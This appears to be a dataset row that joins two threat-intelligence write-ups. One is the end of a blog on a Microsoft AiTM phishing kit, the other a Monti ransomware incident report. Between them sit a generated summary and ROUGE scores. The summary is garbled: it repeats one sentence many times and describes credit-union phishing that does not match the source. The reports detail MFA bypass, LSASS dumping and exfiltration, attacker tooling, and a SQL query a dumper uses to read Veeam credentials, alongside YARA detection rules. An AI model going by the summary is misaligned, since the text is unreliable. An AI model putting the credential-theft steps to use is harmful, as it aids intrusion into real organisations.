the name of the client's graphics driver, as exposed by the WebGL API .By default, VirtualBox and VMware make themselves known this way, and require some masking effort in order to pass this check, for example making use of browser setting `webgl.override-unmasked-renderer` on Firefox.In case the site does not find a reason to suspect the client, it will serve it an authentication cookie that the client-side code will proceed to save before reloading the same page, this time receiving the main phishing page by the site.Figure 8: Upon successful fingerprint process, site returns authentication cookie __3vjQ.Proxy-based AiTM phishing attack overviewTraditional credential phishing sites collect the user's credentials and never complete the authentication process with the actual mail provider's server. If the user has multi-factor authentication (MFA) enabled, then it prevents the attacker from logging into the account with only the stolen credentials.In order to bypass multi-factor authentication, attackers can use Adversary-in-the-middle (AiTM) phishing attacks. All the attacks which we describe in this article used the AiTM phishing attack method.AiTM phishing attacks complete the authentication process with the actual mail provider's server (in this case - Microsoft), unlike traditional credential phishing kits. They achieve this by acting as a MiTM proxy and relaying all the communication back-and-forth between the client (victim) and the server (mail provider).There are three main open-source AiTM phishing kits available which are widely known in the community.Evilginx2MuraenaModlishkaBased on our research, we believe that the threat actor in this case used a custom phishing kit. In the following section, we highlight some of the unique attributes we identified in the client-server communication which differs from the common off-the-shelf AiTM phishing kits.We will not cover the technical details of how the AiTM phishing kits work in general since they are widely documented in the public domain such as here .Unique attributes of the phishing kitAll advanced AiTM kits have in common that they operate as a proxy between the victim and the target site (Microsoft servers in our case).The kits intercept the HTML content received from the Microsoft servers, and before relaying it back to the victim, the content is manipulated by the kit in various ways as needed, to make sure the phishing process works.We observed several ways in which the phishing kit's operation is distinguishable from the three open-source kits:HTML parsingIt's apparent that the phishing kit's backend is making use of an HTML parser library, such as Beautiful Soup.We can deduce this by comparing the messy, unindented HTML code arriving from Microsoft:And the same HTML code as relayed by the phishing kit, tidied up and properly indented:It is likely that the phishing kit feeds the HTML it reads from the Microsoft server into an HTML parser, which creates a programmatic representation of the entire HTML tree. This allows a programmer to conveniently manipulate the different elements by interacting with the objects that represent them.Once the manipulation is done, the library produces an HTML output of the tree with all changes applied. This often results in a tidy output, as we see above.The three open-source kits don't make use of HTML parsers, instead operating on the received HTML data just by using basic string operations.Domain translationOne of the things the kits need to take care of is replacing all the links to the Microsoft domains with equivalent links to the phishing domain, so that the victim remains communicating with the phishing site throughout the phishing session.For example, Figure 9 below shows a side-by-side comparison of an HTML snippet. On the left is the original code as served by Microsoft, and on the right is the same code after it has undergone translation, on its way to be relayed to the victim.Figure 9: HTML snippets before and after translationThe original subdomain (green), the original domain name (blue, minus the TLD), and a unique generated ID (pink) are joined together with dashes and become a subdomain under the phishing site's domain (orange).This translation pattern, namely the 8 hexadecimal digits ID added to links, appears unique to this phishing kit, and is not used by the three open-source kits.However, there's a case where this translation is not taking place.The Office 365 login page, as part of a feature called ""Azure Active Directory Seamless Single Sign-On"", communicates with Microsoft server `autologon.microsoftazuread-sso.com` in order to load company-specific scripts to offer this feature to the authenticating client.The references to this server can be seen in this snippet of JavaScript, taken from the main Office 365 login page:For one reason or another, the phishing kit does not perform translation on the links to `autologon.microsoftazuread-sso.com` shown above, and they make their way to the victims intact.This results in the victim's browser performing HTTP requests like the following, while loading the login page:Effectively ""leaking"" the phishing site's address as the referring site inside a request to the Microsoft server.This opens up the possibility of detecting the kit in the act, if a victim's HTTP traffic is monitored by network security solutions capable of deep packet inspection.Post-compromise activityTo investigate the post-compromise activity, we set up an Azure AD instance in our lab with a dummy account and a domain controlled by us. We visited one of the live phishing URLs, supplied dummy account credentials, and completed the multi-factor authentication process.In one case, we observed that the attacker logged into our account, 8 minutes after we sent our credentials to the attacker's server. It is important to note that the attacker logged into the account from another IP address (different from the phishing domain's IP address). Based on the delay of 8 minutes in post-compromise activity, we suspect that the threat actor is manually logging into the account.Figure 10 below shows audit / sign-in logs from our lab's Azure AD highlighting the post-compromise activity.Figure 10: Azure AD sign-in logs highlighting post-compromise activityAt the time of our investigation, we did not see any specific post-compromise activity performed by the threat actor besides merely logging into the account, reading emails and checking the user's profile information.Zscaler's detection statusZscaler's multilayered cloud security platform detects indicators at various levels, as seen here:HTML.Phish.MicrosoftConclusionBusiness email compromise (BEC) continues to be one of the top threats which organizations need to protect against. As described in this blog, the threat actors are constantly updating their tactics, techniques and procedures (TTPs) to bypass various security measures.Even though security features such as multi-factor authentication (MFA) add an extra layer of security, they should not be considered as a silver bullet to protect against phishing attacks. With the use of advanced phishing kits (AiTM) and clever evasion techniques, threat actors can bypass both traditional as well as advanced security solutions.As an extra precaution, users should not open attachments or click on links in emails sent from untrusted or unknown sources. As a best practice, in general, users should verify the URL in the address bar of the browser before entering any credentials.The Zscaler ThreatLabz team will continue to monitor this active campaign, as well as others, to help keep our customers safe.Indicators of compromise Since the campaign is active at time of the publication and this threat actor is relentless in creating new domains almost every day, the IOCs below should not be considered as an exhaustive list.The complete list of IOCs can be found at our GitHub repository here: https://github.com/threatlabz/iocs/blob/main/aitm_phishing/microsoft_iocs.txtAppendixClient fingerprint collected{u'data': {u'appCodeName': <string>,u'appName': <string>,u'audioCodecs': {u'aac': <string>,u'm4a': <string>,u'mp3': <string>,u'ogg': <string>,u'wav': <string>},u'automation': [<boolean>,<boolean>,<boolean>,<boolean>,<boolean>,<boolean>,<boolean>,<boolean>,<boolean>,<boolean>,<boolean>,<boolean>,<boolean>,<boolean>,<boolean>,<boolean>,<boolean>,<boolean>],u'battery': <boolean>,u'cookieEnabled': <boolean>,u'debugTool': <boolean>,u'devtools': <boolean>,u'document': {u'characterSet': <string>,u'charset': <string>,u'compatMode': <string>,u'contentType': <string>,u'designMode': <string>,u'hidden': <boolean>,u'inputEncoding': <string>,u'isConnected': <boolean>,u'readyState': <string>,u'referrer': <string>,u'title': <string>,u'visibilityState': <string>},u'etsl': <integer>,u'hardwareConcurrency': <integer>,u'hasChrome': <boolean>,u'javaEnabled': <boolean>,u'language': <string>,u'languages': [<string>, <string>],u'mediaSession': <boolean>,u'mimeTypes': [<string>, <string>],u'multimediaDevices': {u'micros': <integer>,u'speakers': <integer>,u'webcams': <integer>},u'permissions': {u'accelerometer': <string>,u'ambient-light-sensor': <string>,u'ambient_light_sensor': <string>,u'background-fetch': <string>,u'background-sync': <string>,u'background_fetch': <string>,u'background_sync': <string>,u'bluetooth': <string>,u'camera': <string>,u'clipboard-write': <string>,u'clipboard_write': <string>,u'device-info': <string>,u'device_info': <string>,u'display-capture': <string>,u'display_capture': <string>,u'geolocation': <string>,u'gyroscope': <string>,u'magnetometer': <string>,u'microphone': <string>,u'midi': <string>,u'nfc': <string>,u'notifications': <string>,u'persistent-storage': <string>,u'persistent_storage': <string>,u'push': <string>,u'speaker-selection': <string>,u'speaker_selection': <string>},u'platform': <string>,u'plugins': [<string>,<string>,<string>,<string>,<string>],u'referrer': <string>,u'screen': {u'cHeight': <integer>,u'cWidth': <integer>,u'orientation': <string>,u'sAvailHeight': <integer>,u'sAvailWidth': <integer>,u'sColorDepth': <integer>,u'sHeight': <integer>,u'sPixelDepth': <integer>,u'sWidth': <integer>,u'wDevicePixelRatio': <integer>,u'wInnerHeight': <integer>,u'wInnerWidth': <integer>,u'wOuterHeight': <integer>,u'wOuterWidth': <integer>,u'wPageXOffset': <integer>,u'wPageYOffset': <integer>,u'wScreenX': <integer>},u'serviceWorker': <boolean>,u'timezone': <string>,u'userAgent': <string>,u'vendor': <string>,u'videoCodecs': {u'h264': <string>,u'ogg': <string>,u'webm': <string>},u'visitorId': <string>,u'webRTC': <boolean>,u'webXR': <boolean>,u'webgl': <string>},u'ftype': <string>}";"The ITSecurity report summarizes the findings of an analysis of phishing emails targeting Federal Credit Unions. The report notes that the threat actor might have compromised the corporate emails of chief executives of these organizations using this phishing attack and later used these compromised business emails to send further phishing emails as part of the same campaign. Additionally, the report notes that there are several other domains involved in this active campaign, some of them are completely randomized while others do not conform to any specific pattern. Additionally, the report notes that the malicious links were sent directly in the email body; in other cases, the link was present inside the HTML file attached to the email. Phishing sites were seen being delivered, redirected into, and hosted using numerous methods. Abuse of legitimate web resources for redirections Phishing sites were seen being delivered, redirected into, and hosted using numerous methods. Abuse of legitimate web resources for redirections Phishing sites were seen being delivered, redirected into, and hosted using numerous methods. Abuse of legitimate web resources for redirections Phishing sites were seen being delivered, redirected into, and hosted using numerous methods. Abuse of legitimate web resources for redirections Phishing sites were seen being delivered, redirected into, and hosted using numerous methods. Abuse of legitimate web resources for redirections Phishing sites were seen being delivered, redirected into, and hosted using numerous methods. Abuse of legitimate web resources for redirections Phishing sites were seen being delivered, redirected into, and hosted using numerous methods. Abuse of legitimate web resources for redirections Phishing sites were seen being delivered, redirected into, and hosted using numerous methods. Abuse of legitimate web resources for redirections Phishing sites were seen being delivered, redirected into, and hosted using numerous methods. Abuse of legitimate web resources for";en;{'r': 0.08153701968134958, 'p': 0.925531914893617, 'f': 0.14987079954540364};{'r': 0.045474613686534215, 'p': 0.8046875, 'f': 0.0860844118583087};{'r': 0.08153701968134958, 'p': 0.925531914893617, 'f': 0.14987079954540364}
https://blogs.blackberry.com/en/2022/09/the-curious-case-of-monti-ransomware-a-real-world-doppelganger;The Curious Case of “Monti” Ransomware: A Real-World Doppelganger;"The Curious Case of ""Monti"" Ransomware: A Real-World DoppelgangerA ransomware victim called in the BlackBerry Incident Response (IR) team during this year's 4th of July holiday weekend. We quickly realized we were investigating an attack by a previously unknown group, calling themselves ""MONTI."" They encrypted nearly 20 user hosts along with a multi-host VMware ESXi cluster that brought down over 20 servers. Threat research shows that the only credible reference of the ""Monti"" ransomware group prior to today was a tweet from security researchers at MalwareHunterTeam, posted on June 30, 2022. The Twitter post mentioned the possibility that Monti ransomware may have had ""5-10 victims in the past months,"" though no data is publicly available on these victims. Most Indicators of Compromise (IOCs) identified by the BlackBerry IR team in the Monti attack were also seen in previous Conti ransomware cases -- except one: Monti threat actors leveraged the Action1 Remote Monitoring and Maintenance (RMM) agent. This article provides a general overview of the incident, denotes the unique characteristics of this ""new"" threat actor group, and includes malware analysis of the payload used. We also include a breakdown of ""Veeamp,"" a password stealer malware targeting the Veeam data backup application, which was identified during the incident. Operating SystemRisk & ImpactMonti Ransomware Incident OverviewOn July 5, 2022, a client engaged the BlackBerry(r) Security Services Incident Response team to perform a forensic investigation and respond to a ransomware-related security incident. The security incident occurred when a threat actor group calling itself ""MONTI"" obtained access to the client's environment. The threat actor apparently intruded via an exploitation of the well-known ""Log4Shell"" vulnerability (a.k.a. CVE-2021-44228) in the client's internet-facing VMware Horizon virtualization system. At the time the BlackBerry team was engaged, the operators had already initially encrypted 18 user desktops. They also encrypted a three-server ESXi cluster that resulted in 21 virtualized servers being impacted. Figure 1 provides an overview of the incident.Figure 1 - Overview of the ""MONTI strain"" ransomware incident The threat actor initially obtained access to the client's VMware Horizon Connection Broker server via Log4Shell exploitation on June 29, 2022. After entering the client's environment, it installed the Google Chrome(tm) browser and used it to download attack tools to the server. The threat actor also downloaded and installed two remote monitoring and maintenance (RMM) agents, AnyDesk and Action1, which we'll describe in more detail later. It used these agents to establish persistence within the network and to facilitate additional remote access. The attackers also used tooling they'd brought into the environment to dump credentials from memory and scan the network. They used Microsoft(r) Windows(r) built-in Remote Desktop Protocol (RDP) to connect to other servers, access data files on network shares, and eventually to deploy the ""MONTI"" strain of ransomware. The goal of this activity was to encrypt multiple hosts within the network (including Veeam-based backups). Meet the Mysterious Monti Ransomware Group The threat group referring to itself as ""MONTI"" is little-known within the threat intelligence community. The limited evidence we discovered regarding this threat actor indicates they emerged between May and June 2022. Based on analysis conducted in this investigation, BlackBerry researchers believe that the Monti group has purposefully (and brazenly) mimicked the better-known ""Conti"" team's tactics, techniques, and procedures (TTPs), along with many of its tools and its ransomware encryptor payload. It seems likely that attackers chose this blatant emulation strategy because of the availability of Conti group's internal communications, chat logs, training guides, real-world identities, and source code -- all of which were publicly leaked on the internet starting in February 2022. Having access to this trove of information effectively gave Monti threat actors a step-by-step guide to emulating Conti's notoriously successful activities. As a response to the data leak, the Conti group went into hiding. Currently, the original Conti ransomware operations group is believed to have dispersed and is no longer in business. At the time of writing this report, public internet and darknet research revealed only a single mention of the Monti ransomware crew, in the form of a Twitter post from the account ""MalwareHunterTeam"" (@malwrhunterteam). This tweet, shown in Figure 2, includes a screenshot of the ""MONTI strain"" ransomware note, and alludes to possible re-use of the Conti codebase.Figure 2 - A tweet from June 30, 2022, discussing ""MONTI strain"" of ransomware Because a mountain of analysis already exists to explain Conti ransomware operations, we will focus on what makes the Monti group unique, and what you can expect when a ""doppelganger"" group such as this spins up operations. Unique Characteristics of Monti Ransomware The ransom note left by the threat actor is taken directly from previously seen Conti notes, with two minor changes: The beginning of the note mentions ""MONTI"" as opposed to ""CONTI."" (The remainder of this sentence is Conti's verbiage, including the instruction to ""Google it"": ""All of your files are currently encrypted by MONTI strain. If you don't know who we are - just 'Google it.'"")strain. If you don't know who we are - just 'Google it.'"") The TOR-based (.onion domain) URL provided for contacting the Monti group is unique. As of July 5, 2022, the .onion domain provided for contacting Monti was unavailable. BlackBerry researchers were unable to find any indication that the domain was ever accessible. Public and darknet research, along with communications with fellow incident response firms, did not reveal any confirmation that the domain was up and running at any time. Given the lack of evidence from other Monti cases, we might never know if the domain was ever accessible. If this is the case, the Monti group might have never been able to collect a ransom. (Should any researcher reading this article have information on a Monti domain/URL being accessible, we would love to hear from you.) In addition to changes in the ransom note, the threat actor leveraged a commercial, cloud-based RMM platform called Action1, which has not previously been used in a ransomware attack. Ransomware actors, including Conti, commonly use commercial RMMs such as AnyDesk during their attacks. In fact, instructions for installation and configuration of the AnyDesk RMM are detailed in the ""CobaltStrike MANUALS_V2 Active Directory"" attack manual that was leaked from the Conti group in 2021. Figure 3 shows a screenshot from this manual, featuring AnyDesk installation instructions.Figure 3 - Example of installation instructions for AnyDesk, as seen in a leaked ""CobaltStrike MANUALS_V2 Active Directory"" document The names of the Action1 agent executables that threat actors used in the Monti attack matched those used by the RMM product itself. Specifically, the files found within the client environment were labeled ""action1_agent.exe"" and ""action1_remote.exe."" When ransomware actors change a file's name, they often do not change the OriginalFileName value. This value is found within the portable executable's (PE's) resources. Though alteration of this value is possible, many actors leave these values alone. As such, you can often find a renamed file by querying against the OriginalFileName value via your endpoint detection and response (EDR) tool, or Sysmon, among other tools. Figure 4 shows the file version information for action1_agent.exe, as seen on VirusTotal.Figure 4 - action1_agent.exe file version information as seen on VirusTotal An example Lucene-based query for the Elasticsearch search and analytics engine might be [OriginalFileName:""action1_agent.exe""]. (Keep this method in mind, as it is very handy during ransomware investigations.) Tools Leveraged in the Ransomware AttackThe attackers used two well-known temporary file transfer websites - dropmefiles.com[.]ua and temp[.]sh - to bring tools into the network and to exfiltrate data. They leveraged the Google Chrome web browser to access these sites and download tools. The attackers' choice to use Chrome(tm) rather than Internet Explorer (IE) may be due to the client's implementation of Enhanced Security Configuration (ESC), an option that can be enabled on Windows servers that prohibits general internet browsing via IE. To bypass the ESC configuration, the attackers used Chrome, allowing them to freely browse web pages. Table 1 lists the various tools leveraged by the Monti group. Tool Type Details Action1 RMM RMM - Commercial Remote Monitoring & Maintenance agent.- Used by TAs to provide remote access to a victim network. AnyDesk RMM RMM - Commercial Remote Monitoring & Maintenance agent.- Used by TAs to provide remote access to a victim network. Avast Anti-rootkit driver Bypass Tool - Avast's Anti-rootkit library is useful for removing rootkits.- Used by threat actors to remove endpoint security products such as antivirus (AV)/endpoint protection platforms (EPPs)/ endpoint protection and response (EDR), etc. GMER Bypass Tool - Rootkit detector and remover- Used by threat actors to remove endpoint security products such as AV/EPP/EDR, etc. MEGASync Data Theft - MEGA.io's proprietary file synchronization agent.- Used by TAs to exfiltrate data from victim networks to cloud storage provider MEGA Mimikatz Credential Theft - Free and open-source tool used to dump credentials, perform pass-the-hash/token attacks in networks, and generally obtain access to legitimate credentials netscannetscan64 Network Scanner - SoftPerfect Network Scanner tool- Used by threat actors to scan internal networks to identify sources for lateral movement PSEXEC Lateral Movement - Microsoft ""SysInternal"" suite utility designed for administrators to run commands on remote systems and/or copy files to remote machines- Commonly used by threat actors to run processes remotely and to facilitate lateral movement PuTTY Data Theft - Data transfer tool commonly used by network administrators- Used by threat actors to exfiltrate data from victim networks Veeam-Get-Creds Credential Theft - Open-source PowerShell script designed to dump credentials from Veeam backup software- See https://github.com/sadshade/veeam-creds Veeamp Credential Theft - Custom Veeam password dumper written in Microsoft .NET- Detailed in the Malware Analysis section found later in this article WinRAR Data Theft - Commercial data archival tool popularized in the early days of the internet and still used by many entities- Often used by threat actors to archive data prior to exfiltration WinSCP Data Theft - Data transfer tool used by network administrators- Used by threat actors to exfiltrate data from victim networks Table 1 - Tools used by the Monti threat group Monti Group Data Access and Exfiltration We reviewed various web browser-related files to analyze attacker access. For example, history and cache files from Internet Explorer, Chrome, and Firefox browsers revealed files potentially accessed by attackers. BlackBerry researchers uncovered more than 250 URLs indicating systems and files the threat group likely accessed. Using the forensic data available on the client's system, we were able to identify a single instance of data exfiltration. The attacker dumped the process memory of the Local Security Authority Server Service (LSASS) on the Horizon Connection Broker server, to a file named ""lsass.DMP."" This filename (specifically with the uppercase file suffix) is the default name given to files created from memory dumps of the LSASS process, when using Windows Task Manager. While attackers can change this filename, when this default name is used, this gives a hint at the provenance of the file. The memory pages allocated to the LSASS process include credentials stored in memory that Windows uses for various authentication and authorization procedures. As such, someone who dumps the memory for this process can recover plaintext credentials by using a tool such as Mimikatz to process the memory dump. Mimikatz can also use this file to facilitate Pass-the-Hash and similar attacks. During data access analysis, BlackBerry researchers found that the threat actor accessed a URL associated with the DropMeFiles file-sharing website. Ransomware operators like this site because it offers temporary and anonymous file-sharing services. We visited the identified URL and confirmed that the attackers uploaded the dumped lsass.DMP file to the DropMeFiles site. Though users of this service can delete files at will, the threat actor neglected to do so. Thus, BlackBerry was able to obtain and review the exfiltrated memory dump. Figure 5 is a screenshot of the DropMeFiles site showing the lsass.DMP file that the threat actor exfiltrated from the client's Horizon Connection Broker server.Figure 5 - Screenshot showing lsass.DMP exfiltration via DropMeFiles Using Code Analysis to Your AdvantageBefore we get into Monti's reuse of Conti's encryptor code, we want to point out a helpful trick that was made possible due to our awareness of that code re-use. Because we were familiar with Conti v2 and v3 encryptor payloads, the BlackBerry IR team knew that Conti encryptor payloads do not always encrypt the entirety of each file. Source code analysis shows us that to determine which encryption methods to use, Conti payloads use a combination of a file's location (on the disk or network), type (based on file suffix), and size. For example, available ENCRYPT_MODES available in Conti v2 payloads include HEADER_ENCRYPT, PARTLY_ENCRYPT, and FULL_ENCRYPT. The PARTLY_ENCRYPT mode can be accompanied by a value of 20 or 50, indicating the percentage of the file that should be encrypted. Researchers Luigi Martire, Carmelo Ragusa, and Luca Mella, from the cybersecurity company Yoroi, wrote a fantastic article named ""Conti Ransomware Source Code: A Well-designed COTS Ransomware,"" which provides insight into the code segments that help drive these encryption decisions. In the article, you will find examples of code segments such as the one shown in Figure 6, which details encryption mode selection based on file size.Figure 6 - Screenshot from Martire, Ragusa, and Mella's 2022 article that shows encryption mode selection based on file size This knowledge allowed the BlackBerry IR team to extract full, unencrypted strings from encrypted log files. The following command uses a simple grep query to identify the string ""2022-0,"" which was found at the beginning of each line in the VMware Horizon Debug logs. Notice that even though the log file included in the command below was encrypted, the command yielded over 137,000 lines of unencrypted log events. $ strings debug-2022-06-30-094202.txt.PUUUK | grep -i '2022-0' | wc -l137420This same methodology can be adapted to many other file types. Text (.txt) and general log files are obviously the best use case. This isn't just applicable to Monti or Conti. Many different ransomware encryptors use a similar process of selecting portions of each file to encrypt. This possibility of decryption is just one of the many reasons why we recommend that ransomware victims back up files encrypted in these attacks. Yes, you read that right: the encrypted files. Even if your encrypted files can't be decrypted in this way, sometimes researchers are able to discover decryption methods that can be offered in stand-alone tools, and ransomware operations groups occasionally release their decryption keys. In any case, encrypted data that has been saved can be revisited and potentially decrypted at a later date. Monti Technical Analysis Ransomware Behavior The ransomware payload associated with this incident is a 32-bit Windows executable named ""locker.exe."" At the time of writing this report, the malware is not publicly available. The threat actor downloaded this payload from temp[.]sh via the Chrome browser. Upon execution, the malware encrypts files on disk, adds a "".PUUUK"" extension to affected files' names, and produces the following ransom note:Figure 6a - Monti ransom note This ransom note is almost identical to the notes produced by some Conti ransomware variants, except it references a ""MONTI strain"" instead of a ""CONTI strain."" Evaluating the Relationship Between Conti and Monti In light of the Conti leaks that occurred in February and March 2022, we decided to explore any connections between the executable we identified, publicly available Conti payloads, and the leaked source code. Brief static analysis determined that our sample's file name, file size, compile time, import table hash, and most section hashes (with the exception of the .data section) match the corresponding characteristics of the locker.exe executable included in the Conti v3 code leaks. These observations provided strong evidence that the executable we found is, in fact, a Conti v3 payload. Further analysis of the leaked Conti executable revealed that, although the code within it was identical to the sample we discovered, execution of the Conti payload did not actually result in any file encryption. A review of the leaked locker.exe's .data section provided insight into the nature of this executable, as seen in Figure 7.Figure 7 - Strings within the leaked locker.exe Conti v3 payload The presence of the strings __DECRYPT_NOTE__, .EXTEN, and __publickey__ suggested that this file was intended as a template for a ransomware builder to generate functional payloads. Although the Conti v3 leak did not include the compiled ransomware builder or its source, the Conti v2 leak did include the ransomware builder executable. Analysis of this executable confirmed that it was responsible for replacing the placeholder text mentioned above with actual values. The decompiler excerpt in Figure 8 shows code within the Conti v2 builder that locates the text placeholders and replaces them with a generated RSA public key, RSA private key (for inclusion in the decryptor only) and ransom note text, respectively.Figure 8 - Conti v2 builder decompiled code excerpt More Clues in the Timestamps After determining the origin of the payload file, we explored how the payload we found was likely generated. The attacker could have compiled the leaked v3 source as the first step to produce their payload. However, we suspect they took a different approach, because the compile time of the ransomware payload we found matches the compile time of the leaked Conti v3 locker.exe: Tue Jan 12 19:20:18 2021 UTC. If the source code had been recompiled, this embedded timestamp would be more recent. This timestamp is consistent with others embedded in each executable. It also aligns with the time period when other Conti samples with the same import table hash (imphash - 5036747C069C42A5E12C38D94DB67FAD) were first submitted to VirusTotal. These observations suggest the timestamp was not manually stomped. If the attacker did not recompile the available source code, we considered the possibility that they had access to a Conti v3 builder to generate the payload. Since we do not have access to a Conti v3 builder, we performed testing with the leaked v2 builder. We built multiple payloads across a period of time and found that they all had the same, older compile time of Tue Sep 15 20:17:05 2020 UTC. While this timestamp differed from our sample and the leaked executable, it confirmed the possibility that the Conti v3 builder might also generate payloads with a consistent compile timestamp. It might seem odd for a builder to maintain an old timestamp, but there is precedent for this approach. The Babuk ransomware builder, leaked in June 2021, produces executables with the same compile time, regardless of when the payload is built. In contrast, the Yashma ransomware builder, leaked in May 2022, generates executables that match the time the build was created. (See our earlier blog posts for more information on Yashma and Babuk.) Is Monti Made With Manual Modification? While the discussion thus far might suggest that the Monti attackers used a non-public Conti v3 builder, there is also reason to believe this was not the case. Instead, the attacker might have manually modified (e.g., using a hex editor) the leaked Conti v3 locker.exe executable. To explain this theory, some additional background is required. One difference between Conti v2 and v3 payloads is the format of the embedded ransom note. In Conti v2 payloads, the ransom note text is stored as plaintext in the .data section of the PE file. In Conti v3 executables, the ransom note is encrypted using the ChaCha8 algorithm. D.J. Bernstein created this algorithm and threat actors implemented it in both Conti v2 and v3 to encrypt files. In Conti v3, it's also used to decrypt the instructions for payment. Comparing the leaked v2 and v3 encryptor source code confirms that only v3 expects the ransom note to be encrypted. In the leaked Conti v2 search.cpp source file (shown in Figure 9 below), although there are several references to the word ""Decrypt,"" there is no actual decryption performed before the ransom note is written to disk.Figure 9 - Conti v2 search.cpp with no ransom note decryption In contrast, the leaked Conti v3 search.cpp source file (shown in Figure 10) includes code to perform ChaCha8 decryption:Figure 10 - Conti v2 search.cpp with ransom note decryption The ChaCha8 algorithm uses a 32-byte key and an 8-byte nonce. A nonce, or number used once, is similar to an initialization vector (IV). It is incorporated into the algorithm to add randomness, so that using the same key to encrypt the same content produces different ciphertext (i.e., it helps mitigate replay attacks). The structure of the key, nonce, and encrypted text in a typical Conti v3 payload is shown in Figure 11 below. Only an excerpt of the ciphertext is shown.Figure 11 - Typical Conti v3 payload with key and nonce Compare the above values with the corresponding bytes in the payload we discovered, shown in Figure 12 below:Figure 12 - Our payload with anomalous key and nonce values As you can see, both the key and nonce in this payload are zero-byte values. Just as the Conti v2 builder dynamically generates the 4096-bit public RSA key before embedding it in the payload, we would also expect the ransom note key and nonce values to be generated during the build process. This suggests that the attacker did not have access to the builder and instead manually inserted a ChaCha8 encrypted ransom note, file extension and RSA public key into the leaked Conti v3 locker.exe executable. Detecting the Differences Due to the absence of a key and nonce, we crafted a signature to find samples that reference ""MONTI."" In the payload discovered during this incident, the bytes 20 19 57 65 03 62 D0 AE F4 D1 68 are decrypted to ""MONTI strain."" Searching for these bytes on VirusTotal resulted in three files with the following SHA-256 hashes: b45fe91d2e2340939781d39daf606622e6d0b9ddacd8425cb8e49c56124c1d56158dcb26239a5db7a0eb67826178f1eaa0852d9d86e59afb86f04e88096a19bc702099b63cb2384e11f088d6bc33afbd43a4c91848f393581242a6a17f1b30a0 All files have a VirusTotal imphash (import hash) value that matches the payload we found. All files were also first submitted to VirusTotal in June 2022, the same month as the incident under investigation. Among the samples on VirusTotal with the imphash 5036747C069C42A5E12C38D94DB67FAD, we did find one more sample that did not have a ChaCha8 key or nonce. It was first submitted to VirusTotal on 2022-04-26 20:13:02 UTC. However, the ransom note for this payload did not reference ""MONTI"" (or any ""strain""), so the connection with the Monti actor is unclear. Veeam Credential Dumper During our investigation, we also found malware named veeamp.exe, with SHA-256 hash 9AA1F37517458D635EAE4F9B43CB4770880EA0EE171E7E4AD155BBDEE0CBE732. This file attempts to dump credentials from a SQL database for Veeam backup management software. (The credential dumper is briefly mentioned in this Symantec blog.) Some researchers associate this malware with Yanluowang ransomware. It is important to clarify that this credential dumper might have been used by threat actors that also deployed Yanluowang ransomware, but veeamp.exe is not ransomware, and is only capable of dumping Veeam credentials. The file is a 32-bit .NET binary. The code employs control-flow flattening, which is an obfuscation technique that makes it more challenging to understand the flow of execution. When launched, the malware attempts a connection to a SQL database named VeeamBackup. If it cannot connect to the specified database, no further action is taken. However, if a connection is established, the file runs the following command: select [user_name],[password],[description] FROM [VeeamBackup].[dbo].[Credentials] The program then attempts to decrypt any user passwords that are returned by this command. As discussed in this Veeam documentation, passwords can be encoded and/or encrypted using several approaches, including simple base64 encoding, or through the use of Microsoft's ProtectedData class. The credential dumper uses these approaches to attempt decryption. If it's successful, it prints to the screen the following information: UsernameEncrypted passwordDecrypted passwordDescription for each user in the Credentials tableIt prints this information in the following format: user: {0} encrypted pass: {1} decrypted pass: {2} description: {3} The database name, SQL command, and output format string are all encoded in the executable, using a single-byte XOR key that varies for each string. Two similar Veeam credential dumpers are currently available on VirusTotal (first link, second link). At the time of this writing, both have low detection rates (i.e., 15 detections or less). Both files have similar code to the credential dumper we found, but they are also obfuscated with Eazfuscator.NET. ConclusionWhile the activity of the Monti group itself seems to have been short lived, there is more we can learn from its copycat techniques. As additional Ransomware-as-a-Service (RaaS) solution builders and source code become leaked, either publicly or privately, we could continue to see these doppelganger-like ransomware groups proliferate. General familiarity with the TTPs of known groups can help us identify any unique traits of these lookalike crews. The more we can identify these unique traits, the better we will be able to associate known analysis methodologies with these new cases while keeping our eye out for differences. YARA RuleThe following YARA rules were authored by the BlackBerry Research & Intelligence Team to catch the threats described in this document: rule monti_ransom {meta:description = ""Detects ChaCha8 encrypted 'MONTI Strain' text (using all-zero key and nonce) embedded in ransomware payload""author = ""BlackBerry Threat Research Team""date = ""August 15, 2021""license = ""This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"" strings:$s = {20 19 57 65 03 62 D0 AE F4 D1 68} condition:uint16be(0) == 0x4d5a and filesize < 2MBand $s} rule veeam_dumper {meta:description = ""Detects Veeam credential Dumper""author = ""BlackBerry Threat Research Team""date = ""August 15, 2021""license = ""This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team""strings:$s1 = ""SqlCommand"" fullword ascii wide$s2 = ""SqlConnection"" fullword ascii wide$s3 = ""SqlDataReader"" fullword ascii wide$s4 = ""veeamp.exe"" fullword ascii wide$s5 = ""veeamp.pdb"" fullword ascii wide condition:uint16be(0) == 0x4d5a and filesize < 60KBand 4 of them} Indicators of Compromise (IoCs) ""MONTI"" payload SHA-256 hashes: b45fe91d2e2340939781d39daf606622e6d0b9ddacd8425cb8e49c56124c1d56 158dcb26239a5db7a0eb67826178f1eaa0852d9d86e59afb86f04e88096a19bc 702099b63cb2384e11f088d6bc33afbd43a4c91848f393581242a6a17f1b30a0 Veeam Credential Dumper SHA-256 hashes: 9aa1f37517458d635eae4f9b43cb4770880ea0ee171e7e4ad155bbdee0cbe732df492b4cc7f644ad3e795155926d1fc8ece7327c0c5c8ea45561f24f5110ce5478517fb07ee5292da627c234b26b555413a459f8d7a9641e4a9fcc1099f06a3d References MalwareHunterTeam. (2022). ""Monti strain."" Retrieved from https://twitter.com/malwrhunterteam/status/1542595315915710465?s=20&t=Y7d3POTgnMSB_JcyEeF5_g Martire, Ragusa, & Mella. (2022). ""Conti Ransomware Source Code: A Well-designed COTS Ransomware."" Retrieved from https://yoroi.company/research/conti-ransomware-source-code-a-well-designed-cots-ransomware/ BlackBerry Assistance If you're battling this malware or a similar threat, you've come to the right place, regardless of your existing BlackBerry relationship. The BlackBerry Incident Response team is made up of world-class consultants dedicated to handling response and containment services for a wide range of incidents, including ransomware and Advanced Persistent Threat (APT) cases. We have a global consulting team standing by to assist you, providing around-the-clock support where required, as well as local assistance. Please contact us here: https://www.blackberry.com/us/en/forms/cylance/handraiser/emergency-incident-response-containment Related Reading: Threat Thursday: Conti Ransoms Over 400 Organizations WorldwideLog4U, Shell4Me: A 